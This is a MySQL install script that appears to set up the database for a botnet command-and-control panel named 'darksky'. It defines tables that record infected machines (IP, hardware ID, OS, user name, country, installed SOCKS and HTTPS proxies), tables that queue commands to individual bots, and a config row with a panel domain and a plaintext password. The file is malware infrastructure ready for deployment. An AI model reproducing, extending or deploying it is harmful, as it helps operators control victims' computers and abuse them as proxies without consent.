SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

CREATE TABLE IF NOT EXISTS `cmd` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `cmd` text NOT NULL,
  `amount` int(11) NOT NULL,
  `done` int(11) NOT NULL,
  `country` text,
  `forid` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;


CREATE TABLE IF NOT EXISTS `darksky_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` text NOT NULL,
  `time` int(11) NOT NULL,
  `hwid` text NOT NULL,
  `country` text NOT NULL,
  `countrycode` text NOT NULL,
  `os` text NOT NULL,
  `userpc` text NOT NULL,
  `status` int(11) NOT NULL,
  `isadmin` int(11) NOT NULL,
  `datereg` datetime DEFAULT NULL,
  `banned` int(1) DEFAULT NULL,
  `installed_socks` int(1) DEFAULT NULL,
  `s4` int(11) DEFAULT NULL,
  `s5` int(11) DEFAULT NULL,
  `https` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `last_cmd` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `idbot` int(11) NOT NULL,
  `idcmd` int(11) NOT NULL,
  `viewed` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;


CREATE TABLE IF NOT EXISTS `a_config` (
  `path` text NOT NULL,
  `domain` text NOT NULL,
  `lang` int(1) NOT NULL,
  `chpu` int(1) NOT NULL,
  `cache_delete` int(1) NOT NULL,
  `viewlastcmd` int(1) NOT NULL,
  `pages` int(3) NOT NULL,
  `login` text NOT NULL,
  `pass` text NOT NULL,
  `mode` int(1) NOT NULL,
  `access` text,
  `title` text NOT NULL,
  `maxusers` int(11) NOT NULL,
  `repeatban` int(11) NOT NULL,
  `autoban` int(1) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;


INSERT INTO `a_config` (`path`, `domain`, `lang`, `chpu`, `cache_delete`, `viewlastcmd`, `pages`, `login`, `pass`, `mode`, `access`, `title`, `maxusers`, `repeatban`, `autoban`) VALUES
('template/my', 'http://csgowincloud.com/', 0, 0, 0, 0, 1, '', '33211qq', 0, '', ' Panel v 0.7', 0, 0, 0);